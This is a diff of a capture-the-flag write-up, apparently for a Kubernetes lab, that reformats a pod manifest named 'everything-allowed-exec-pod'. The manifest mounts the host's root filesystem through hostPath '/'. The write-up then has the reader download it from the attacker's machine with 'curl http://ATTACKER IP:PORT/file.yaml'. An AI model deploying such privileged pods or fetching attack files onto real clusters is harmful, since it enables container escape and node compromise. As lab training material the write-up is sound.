@@ -39,9 +39,8 @@ To get next two answers all we need to do is fllow instruction. Flag 3 is in sam
 
 Task 7
 First we need to prepare .yaml file
-
-> apiVersion: v1
->kind: Pod
+`apiVersion: v1
+kind: Pod
 metadata:
   name: everything-allowed-exec-pod
   labels:
@@ -65,7 +64,8 @@ spec:
   volumes:
   - name: noderoot
     hostPath:
-      path: /
+      path: /`
+
  
 To get file into TARGET machine lets start ftp server on our machine
 then simply curl http://ATTACKER IP:PORT/file.yaml
